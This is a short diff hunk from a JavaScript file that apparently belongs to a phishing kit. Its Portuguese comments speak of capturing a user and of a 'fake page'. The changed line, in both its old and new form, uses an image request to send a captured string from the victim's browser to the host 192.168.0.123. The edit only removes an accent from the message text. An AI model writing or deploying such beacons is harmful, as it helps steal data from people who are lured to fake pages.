@@ -12,4 +12,4 @@ str2 = str.replace(strbusca, "_");
 //alert(str2);
 //alert('captura usuario / editar arquivo captura_usuario.js')
 
-new Image().src = "http://192.168.0.123/?=" + str2 + "_Recebeu_a_página_falsa_aguarde_captura...."
+new Image().src = "http://192.168.0.123/?=" + str2 + "_Recebeu_a_pagina_falsa_aguarde_captura...."
